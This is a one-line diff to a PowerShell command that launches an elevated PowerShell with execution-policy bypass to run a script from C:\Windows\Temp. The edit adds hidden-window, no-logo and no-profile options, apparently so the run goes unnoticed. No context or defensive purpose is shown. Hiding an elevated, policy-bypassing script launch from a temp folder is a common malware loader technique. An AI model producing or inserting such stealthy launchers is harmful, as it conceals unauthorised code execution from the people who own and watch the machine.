@@ -1,1 +1,1 @@
-Start-Process PowerShell -verb runas -ArgumentList '-exe bypass -noexit','-File','C:\Windows\Temp\abcd.ps1'
+Start-Process -WindowStyle hidden PowerShell -verb runas -ArgumentList '-WindowStyle hidden -nologo -noprofile -exe bypass -noexit','-File','C:\Windows\Temp\abcd.ps1'
